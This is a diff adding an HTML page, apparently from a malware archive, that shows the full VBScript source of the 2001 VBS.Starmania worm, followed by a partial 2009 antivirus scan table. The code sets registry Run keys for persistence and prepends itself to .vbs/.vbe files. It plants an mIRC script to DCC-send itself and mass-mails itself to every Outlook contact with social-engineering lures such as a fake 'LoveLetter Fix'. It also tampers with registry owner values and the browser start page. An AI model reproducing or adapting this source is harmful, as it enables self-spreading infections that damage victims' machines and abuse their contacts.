@@ -1,0 +1,224 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
+<html>
+<head>
+<META http-equiv=Content-Type content="text/html; charset=windows-1252">
+<title>20010509 - VBS.Starmania</title>
+<style type="text/css">
+span {
+	font-family: 'Courier New';
+	font-size: 10pt;
+	color: #000000;
+}
+.sc0 {
+}
+.sc1 {
+	color: #008000;
+}
+.sc2 {
+	color: #FF0000;
+}
+.sc3 {
+	color: #0000FF;
+}
+.sc4 {
+	color: #808080;
+}
+.sc6 {
+}
+.sc7 {
+}
+.sc10 {
+}
+</style>
+</head>
+<body>
+<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">' Name : VBS.Starmania.A
+' Author : PetiK
+' Date : May 09th 2001
+' Size : 4566 bytes
+' Action : It copies itself to %windir%\Hwinfo.vbs and to %systemroot%\Issetup.vbs.
+' It adds to values. The first in the Run key and the second in the RunServices
+' key. Then it infects all *.vbs and *.vbe files in differents folder :
+'
+'   C:\WINDOWS          \
+'   C:\WINDOWS\SYSTEM       |
+'   C:\WINDOWS\TEMP     |_
+'   C:\WINDOWS\SAMPLES\WSH  |- All those name are by default
+'   C:\WINDOWS\DEKTOP       |
+'   C:\MY DOCUMENTS     /
+' The virus adds his code at the start of the file.
+'
+' After it creates a script.ini file to C:\mirc folder. When the current day is
+' 15th, the worm displays a message, changes the RegisteredOwner and Registered-
+' Organization by “Starmania” and “PetiK Corpor@tion” and adds some values to
+' display a message when the computer start. It changes all days the Start Page
+' of Internet Explorer between five differents adresses :
+'
+'   http://www.symantec.com
+'   http://www.pandasoftware.com
+'   http://www.avp.ch
+'   http://www.cia.gov
+'   http://www.fbi.gov 
+'
+' At the end, it spreads with Outlook. There are three differents subject, body
+' and attachments :
+'
+'First :    Subject : New Picture for you !
+'       Body : Look at this nice picture attached
+'       Attached : NewPic__Cool.jpg.vbs
+'
+'Second :   Subject : LoveLetter Fix
+'       Body : Protect you against VBS.LoveLetter.Variant
+'       Attached : LoveFix.vbs
+'
+'Third :    Subject : How to win a holiday in Paris
+'       Body : Play at this game attached and win a holiday in Paris
+'       Attached : Win_A_Holiday.vbs
+'
+</span><span class="sc0">
+</span><span class="sc1">'VBS.Starmania
+'Coded by PetiK on 09/05/2001
+'Made In France
+</span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc0">
+</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">f</span><span class="sc6">,</span><span class="sc7">w</span><span class="sc6">,</span><span class="sc7">file</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">f</span><span class="sc6">=</span><span class="sc7">CreateObject</span><span class="sc6">(</span><span class="sc4">"Scripting.FileSystemObject"</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">w</span><span class="sc6">=</span><span class="sc7">CreateObject</span><span class="sc6">(</span><span class="sc4">"WScript.Shell"</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">file</span><span class="sc6">=</span><span class="sc7">f.OpenTextFile</span><span class="sc6">(</span><span class="sc7">WScript.ScriptFullName</span><span class="sc6">,</span><span class="sc2">1</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc7">vbsworm</span><span class="sc6">=</span><span class="sc7">file.ReadAll</span><span class="sc0">
+
+</span><span class="sc7">START</span><span class="sc6">()</span><span class="sc0">
+</span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">START</span><span class="sc6">()</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">win</span><span class="sc6">=</span><span class="sc7">f.GetSpecialFolder</span><span class="sc6">(</span><span class="sc2">0</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">sys</span><span class="sc6">=</span><span class="sc7">f.GetSpecialFolder</span><span class="sc6">(</span><span class="sc2">1</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">cop</span><span class="sc6">=</span><span class="sc7">f.GetFile</span><span class="sc6">(</span><span class="sc7">WScript.ScriptFullName</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc7">cop.Copy</span><span class="sc6">(</span><span class="sc7">win&amp;</span><span class="sc4">"\Hwinfo.vbs"</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc7">cop.Copy</span><span class="sc6">(</span><span class="sc7">sys&amp;</span><span class="sc4">"\Issetup.vbs"</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc7">run</span><span class="sc6">=(</span><span class="sc4">"HKLM\Software\Microsoft\Windows\CurrentVersion\Run\Hwinfo"</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc7">runs</span><span class="sc6">=(</span><span class="sc4">"HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices\Issetup"</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc7">w.RegWrite</span><span class="sc0"> </span><span class="sc7">run</span><span class="sc6">,(</span><span class="sc7">win&amp;</span><span class="sc4">"\Hwinfo.vbs"</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc7">w.RegWrite</span><span class="sc0"> </span><span class="sc7">runs</span><span class="sc6">,(</span><span class="sc7">sys&amp;</span><span class="sc4">"\Issetup.vbs"</span><span class="sc6">)</span><span class="sc0">
+
+</span><span class="sc7">MD</span><span class="sc6">=</span><span class="sc7">w.RegRead</span><span class="sc6">(</span><span class="sc4">"HKLM\Software\Microsoft\Windows\CurrentVersion\explorer\Shell Folders\Personal"</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc7">ptk</span><span class="sc6">(</span><span class="sc7">win</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc7">ptk</span><span class="sc6">(</span><span class="sc7">sys</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc7">ptk</span><span class="sc6">(</span><span class="sc7">f.GetSpecialFolder</span><span class="sc6">(</span><span class="sc2">2</span><span class="sc6">))</span><span class="sc0">
+</span><span class="sc7">ptk</span><span class="sc6">(</span><span class="sc7">win&amp;</span><span class="sc4">"\Samples\Wsh"</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc7">ptk</span><span class="sc6">(</span><span class="sc7">win&amp;</span><span class="sc4">"\Desktop"</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc7">ptk</span><span class="sc6">(</span><span class="sc7">MD</span><span class="sc6">)</span><span class="sc0">
+
+</span><span class="sc7">Worm</span><span class="sc0"> </span><span class="sc4">""</span><span class="sc0">
+</span><span class="sc7">Mess</span><span class="sc6">()</span><span class="sc0">
+</span><span class="sc7">Raffle</span><span class="sc6">()</span><span class="sc0">
+</span><span class="sc7">Email</span><span class="sc6">()</span><span class="sc0">
+
+</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">
+
+</span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">ptk</span><span class="sc6">(</span><span class="sc7">Folder</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">f.FolderExists</span><span class="sc6">(</span><span class="sc7">Folder</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">then</span><span class="sc0">
+</span><span class="sc3">For</span><span class="sc0"> </span><span class="sc3">each</span><span class="sc0"> </span><span class="sc7">P</span><span class="sc0"> </span><span class="sc3">in</span><span class="sc0"> </span><span class="sc7">f.GetFolder</span><span class="sc6">(</span><span class="sc7">Folder</span><span class="sc6">).</span><span class="sc7">Files</span><span class="sc0">
+</span><span class="sc7">ext</span><span class="sc6">=</span><span class="sc7">f.GetExtensionName</span><span class="sc6">(</span><span class="sc7">P.Name</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">ext</span><span class="sc6">=</span><span class="sc4">"vbs"</span><span class="sc0"> </span><span class="sc3">or</span><span class="sc0"> </span><span class="sc7">ext</span><span class="sc6">=</span><span class="sc4">"vbe"</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">VF</span><span class="sc6">=</span><span class="sc7">f.OpenTextFile</span><span class="sc6">(</span><span class="sc7">P.path</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc7">mark</span><span class="sc6">=</span><span class="sc7">VF.Read</span><span class="sc6">(</span><span class="sc2">14</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc7">VF.Close</span><span class="sc0">
+
+</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">mark</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc4">"'VBS.Starmania"</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">VF</span><span class="sc6">=</span><span class="sc7">f.OpenTextFile</span><span class="sc6">(</span><span class="sc7">P.path</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc7">VC</span><span class="sc6">=</span><span class="sc7">VF.ReadAll</span><span class="sc0">
+</span><span class="sc7">VF.Close</span><span class="sc0">
+</span><span class="sc7">VCd</span><span class="sc6">=</span><span class="sc7">vbsworm</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">VC</span><span class="sc0">
+
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">VF</span><span class="sc6">=</span><span class="sc7">f.OpenTextFile</span><span class="sc6">(</span><span class="sc7">P.path</span><span class="sc6">,</span><span class="sc2">2</span><span class="sc6">,</span><span class="sc3">True</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc7">VF.Write</span><span class="sc0"> </span><span class="sc7">VCd</span><span class="sc0">
+</span><span class="sc7">VF.Close</span><span class="sc0">
+</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
+</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
+</span><span class="sc3">Next</span><span class="sc0">
+</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
+</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0">
+
+</span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">Worm</span><span class="sc6">(</span><span class="sc7">Path</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">Path</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">""</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
+</span><span class="sc7">prgfl</span><span class="sc6">=</span><span class="sc7">w.RegRead</span><span class="sc6">(</span><span class="sc4">"HKLM\Software\Microsoft\Windows\CurrentVersion\ProgramFilesDir"</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">f.FileExists</span><span class="sc6">(</span><span class="sc4">"C:\mirc\mirc.ini"</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0"> </span><span class="sc7">Path</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"C:\mirc"</span><span class="sc0">
+</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">f.FileExists</span><span class="sc6">(</span><span class="sc7">prgfl</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"\mirc\mirc.ini"</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0"> </span><span class="sc7">Path</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">prgfl</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"\mirc"</span><span class="sc0">
+</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">f.FileExists</span><span class="sc6">(</span><span class="sc4">"C:\mirc32\mirc.ini"</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0"> </span><span class="sc7">Path</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"C:\mirc32"</span><span class="sc0">
+</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">f.FileExists</span><span class="sc6">(</span><span class="sc7">prgfl</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"\mirc32\mirc.ini"</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0"> </span><span class="sc7">Path</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">prgfl</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"\mirc32"</span><span class="sc0">
+</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
+</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">Path</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc4">""</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">mirc</span><span class="sc6">=</span><span class="sc7">f.CreateTextFile</span><span class="sc6">(</span><span class="sc7">Path</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"\script.ini"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">True</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc7">mirc.WriteLine</span><span class="sc0"> </span><span class="sc4">"[script]"</span><span class="sc0">
+</span><span class="sc7">mirc.WriteLine</span><span class="sc0"> </span><span class="sc4">"n0=ON 1:JOIN:#:{ /if ( $nick == $me ) { halt } "</span><span class="sc0">
+</span><span class="sc7">mirc.WriteLine</span><span class="sc0"> </span><span class="sc4">"n1=  /dcc send $nick "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">f.GetSpecialFolder</span><span class="sc6">(</span><span class="sc2">0</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc4">"\Hwinfo.vbs"</span><span class="sc0">
+</span><span class="sc7">mirc.WriteLine</span><span class="sc0"> </span><span class="sc4">"n2=}"</span><span class="sc0">
+</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
+</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0">
+
+</span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">Mess</span><span class="sc6">()</span><span class="sc0">
+</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">Day</span><span class="sc6">(</span><span class="sc7">Now</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">15</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
+</span><span class="sc7">w.RegWrite</span><span class="sc0"> </span><span class="sc4">"HKLM\Software\Microsoft\Windows\CurrentVersion\Run\StarMania"</span><span class="sc6">,</span><span class="sc4">"rundll32 mouse,disable"</span><span class="sc0">
+</span><span class="sc7">w.RegWrite</span><span class="sc0"> </span><span class="sc4">"HKLM\Software\Microsoft\Windows\CurrentVersion\Winlogon\LegalNoticeText"</span><span class="sc6">,</span><span class="sc4">"How are you today ? For my part, I'm fine"</span><span class="sc0">
+</span><span class="sc7">w.RegWrite</span><span class="sc0"> </span><span class="sc4">"HKLM\Software\Microsoft\Windows\CurrentVersion\Winlogon\LegalNoticeCaption"</span><span class="sc6">,</span><span class="sc4">"VBS.Starmania"</span><span class="sc0">
+</span><span class="sc7">w.RegWrite</span><span class="sc0"> </span><span class="sc4">"HKLM\Software\Microsoft\Windows\CurrentVersion\RegisteredOwner"</span><span class="sc6">,</span><span class="sc4">"Starmania"</span><span class="sc0">
+</span><span class="sc7">w.RegWrite</span><span class="sc0"> </span><span class="sc4">"HKLM\Software\Microsoft\Windows\CurrentVersion\RegisteredOrganization"</span><span class="sc6">,</span><span class="sc4">"PetiK Corpor@tion"</span><span class="sc0">
+</span><span class="sc7">MsgBox</span><span class="sc0"> </span><span class="sc4">"Hi man, it's my new Worm/Virus. It was coded by PetiK in 2001"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">vbinformation</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"VBS.Starmania"</span><span class="sc0">
+</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
+</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">
+
+</span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">Raffle</span><span class="sc6">()</span><span class="sc0">
+</span><span class="sc7">Randomize</span><span class="sc0">
+</span><span class="sc7">lot</span><span class="sc6">=</span><span class="sc10">Int</span><span class="sc6">((</span><span class="sc2">5</span><span class="sc6">*</span><span class="sc7">Rnd</span><span class="sc6">)+</span><span class="sc2">1</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">lot</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
+</span><span class="sc7">w.RegWrite</span><span class="sc0"> </span><span class="sc4">"HKCU\Software\Microsoft\Internet Explorer\Main\Start Page"</span><span class="sc6">,</span><span class="sc4">"http://www.symantec.com"</span><span class="sc0">
+</span><span class="sc3">elseif</span><span class="sc0"> </span><span class="sc7">lot</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
+</span><span class="sc7">w.RegWrite</span><span class="sc0"> </span><span class="sc4">"HKCU\Software\Microsoft\Internet Explorer\Main\Start Page"</span><span class="sc6">,</span><span class="sc4">"http://www.pandasoftware.com"</span><span class="sc0">
+</span><span class="sc3">elseif</span><span class="sc0"> </span><span class="sc7">lot</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
+</span><span class="sc7">w.RegWrite</span><span class="sc0"> </span><span class="sc4">"HKCU\Software\Microsoft\Internet Explorer\Main\Start Page"</span><span class="sc6">,</span><span class="sc4">"http://www.avp.ch"</span><span class="sc0">
+</span><span class="sc3">elseif</span><span class="sc0"> </span><span class="sc7">lot</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
+</span><span class="sc7">w.RegWrite</span><span class="sc0"> </span><span class="sc4">"HKCU\Software\Microsoft\Internet Explorer\Main\Start Page"</span><span class="sc6">,</span><span class="sc4">"http://www.cia.gov"</span><span class="sc0">
+</span><span class="sc3">elseif</span><span class="sc0"> </span><span class="sc7">lot</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
+</span><span class="sc7">w.RegWrite</span><span class="sc0"> </span><span class="sc4">"HKCU\Software\Microsoft\Internet Explorer\Main\Start Page"</span><span class="sc6">,</span><span class="sc4">"http://www.fbi.gov"</span><span class="sc0">
+</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
+</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">
+
+</span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">Email</span><span class="sc6">()</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">O</span><span class="sc6">=</span><span class="sc7">CreateObject</span><span class="sc6">(</span><span class="sc4">"Outlook.Application"</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">mapi</span><span class="sc6">=</span><span class="sc7">O.GetNameSpace</span><span class="sc6">(</span><span class="sc4">"MAPI"</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">For</span><span class="sc0"> </span><span class="sc3">Each</span><span class="sc0"> </span><span class="sc7">AL</span><span class="sc0"> </span><span class="sc3">In</span><span class="sc0"> </span><span class="sc7">mapi.AddressLists</span><span class="sc0">
+</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">AL.AddressEntries.Count</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
+</span><span class="sc3">For</span><span class="sc0"> </span><span class="sc7">AddListCount</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc3">To</span><span class="sc0"> </span><span class="sc7">AL.AddressEntries.Count</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">ALE</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">AL.AddressEntries</span><span class="sc6">(</span><span class="sc7">AddListCount</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">go</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">O.CreateItem</span><span class="sc6">(</span><span class="sc2">0</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc7">go.To</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">ALE.Address</span><span class="sc0">
+</span><span class="sc7">Randomize</span><span class="sc0">
+</span><span class="sc7">num</span><span class="sc6">=</span><span class="sc10">Int</span><span class="sc6">((</span><span class="sc2">3</span><span class="sc6">*</span><span class="sc7">Rnd</span><span class="sc6">)+</span><span class="sc2">1</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">c</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">f.GetFile</span><span class="sc6">(</span><span class="sc7">WScript.ScriptFullName</span><span class="sc6">)</span><span class="sc0">
+
+</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">num</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc3">then</span><span class="sc0">
+</span><span class="sc7">c.Copy</span><span class="sc6">(</span><span class="sc7">fso.GetSpecialFolder</span><span class="sc6">(</span><span class="sc2">0</span><span class="sc6">)&amp;</span><span class="sc4">"\NewPic__Cool.jpg.vbs"</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc7">go.Subject</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"New Picture for you !"</span><span class="sc0">
+</span><span class="sc7">go.Body</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"Look at this nice picture attached"</span><span class="sc0">
+</span><span class="sc7">go.Attachments.Add</span><span class="sc0"> </span><span class="sc7">f.BuildPath</span><span class="sc6">(</span><span class="sc7">f.GetSpecialfolder</span><span class="sc6">(</span><span class="sc2">0</span><span class="sc6">),</span><span class="sc4">"NewPic__Cool.jpg.vbs"</span><span class="sc6">)</span><span class="sc0">
+
+</span><span class="sc3">elseif</span><span class="sc0"> </span><span class="sc7">num</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc3">then</span><span class="sc0">
+</span><span class="sc7">c.Copy</span><span class="sc6">(</span><span class="sc7">fso.GetSpecialFolder</span><span class="sc6">(</span><span class="sc2">0</span><span class="sc6">)&amp;</span><span class="sc4">"\LoveFix.vbs"</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc7">go.Subject</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"LoveLetter Fix"</span><span class="sc0">
+</span><span class="sc7">go.Body</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"Protect you against VBS.LoveLetter.Variant"</span><span class="sc0">
+</span><span class="sc7">go.Attachments.Add</span><span class="sc0"> </span><span class="sc7">f.BuildPath</span><span class="sc6">(</span><span class="sc7">f.GetSpecialfolder</span><span class="sc6">(</span><span class="sc2">0</span><span class="sc6">),</span><span class="sc4">"LoveFix.vbs"</span><span class="sc6">)</span><span class="sc0">
+
+</span><span class="sc3">elseif</span><span class="sc0"> </span><span class="sc7">num</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0"> </span><span class="sc3">then</span><span class="sc0">
+</span><span class="sc7">c.Copy</span><span class="sc6">(</span><span class="sc7">fso.GetSpecialFolder</span><span class="sc6">(</span><span class="sc2">0</span><span class="sc6">)&amp;</span><span class="sc4">"\Win_A_Holiday.vbs"</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc7">go.Subject</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"How to win a holiday in Paris"</span><span class="sc0">
+</span><span class="sc7">go.Body</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"Play at this game attached and win a holiday in Paris"</span><span class="sc0">
+</span><span class="sc7">go.Attachments.Add</span><span class="sc0"> </span><span class="sc7">f.BuildPath</span><span class="sc6">(</span><span class="sc7">f.GetSpecialfolder</span><span class="sc6">(</span><span class="sc2">0</span><span class="sc6">),</span><span class="sc4">"Win_A_Holiday.vbs"</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
+</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">go.To</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc4">""</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
+</span><span class="sc7">go.Send</span><span class="sc0">
+</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
+</span><span class="sc3">Next</span><span class="sc0">
+</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
+</span><span class="sc3">Next</span><span class="sc0">
+</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">
+</span>
+<br><span class="sc0"><table border="1"><tr><td colspan="4">File Starmania.vbs received on 2009.06.10 04:11:48 (UTC)</td></tr><tr><td>Antivirus</td><td>Version</td><td>Last Update</td><td>Result</td</tr><tr><td>a-squared</td><td>4.5.0.18</td><td>2009.06.10</td><td style="color: red;">IRC-Worm.VBS.Generic!IK</td</tr><tr><td>AhnLab-V3</td><td>5.0.0.2</td><td>2009.06.09</td><td>-</td</tr><tr><td>AntiVir</td><td>7.9.0.183</td><td>2009.06.09</td><td style="color: red;">VBS/Starmania.1</td</tr><tr><td>Antiy-AVL</td><td>2.0.3.1</td><td>2009.06.10</td><td style="color: red;">Worm/VBS.Generic</td</tr><tr><td>Authentium</td><td>5.1.2.4</td><td>2009.06.10</td><td style="color: red;">VBS/StarMania.A@m</td</tr><tr><td>Avast</td><td>4.8.1335.0</td><td>2009.06.09</td><td style="color: red;">VBS:MailWorm-gen</td</tr><tr><td>AVG</td><td>8.5.0.339</td><td>2009.06.09</td><td style="color: red;">I-Worm/Petik</td</tr><tr><td>BitDefender</td><td>7.2</td><td>2009.06.10</td><td style="color: red;">Generic.ScriptWorm.E9844292</td</tr><tr><td>CAT-QuickHeal</td><td>10.00</td><td>2009.06.10</td><td style="color: red;">VBS/StarMania.A</td</tr><tr><td>ClamAV</td><td>0.94.1</td><td>2009.06.10</td><td>-</td</tr><tr><td>Comodo</td><td>1299</td><td>2009.06.10</td><td style="color: red;">IRC-Worm.VBS.Generic</td</tr><tr><td>DrWeb</td><td>5.0.0.12182</td><td>2009.06.10</td><td style="color: red;">modification of VBS.Merlin</td</tr><tr><td>eSafe</td><td>7.0.17.0</td><td>2009.06.09</td><td style="color: red;">VBS.Petick.</td</tr><tr><td>eTrust-Vet</td><td>31.6.6550</td><td>2009.06.09</td><td style="color: red;">VBS/VBSWG!generic</td</tr><tr><td>F-Prot</td><td>4.4.4.56</td><td>2009.06.10</td><td style="color: red;">VBS/StarMania.A@m</td</tr><tr><td>F-Secure</td><td>8.0.14470.0</td><td>2009.06.09</td><td style="color: red;">IRC-Worm.VBS.Generic</td</tr><tr><td>Fortinet</td><td>3.117.0.0</td><td>2009.06.09</td><td style="color: red;">VBS/StarMania.A@mm</td</tr><tr><td>GData</td><td>19</td><td>2009.06.10</td><td style="color: red;">Generic.ScriptWorm.E9844292</td</tr><tr><td>Ikarus</td><td>T3.1.1.59.0</td><td>2009.06.10</td><td>-</td</tr><tr><td>K7AntiVirus</td><td>7.10.757</td><td>2009.06.08</td><td>-</td</tr><tr><td>Kaspersky</td><td>7.0.0.125</td><td>2009.06.10</td><td style="color: red;">IRC-Worm.VBS.Generic</td</tr><tr><td>McAfee</td><td>5641</td><td>2009.06.09</td><td style="color: red;">VBS/Chism</td</tr><tr><td>McAfee+Artemis</td><td>5641</td><td>2009.06.09</td><td style="color: red;">VBS/Chism</td</tr><tr><td>McAfee-GW-Edition</td><td>6.7.6</td><td>2009.06.10</td><td style="color: red;">Script.Starmania.1</td</tr><tr><td>Microsoft</td><td>1.4701</td><td>2009.06.10</td><td style="color: 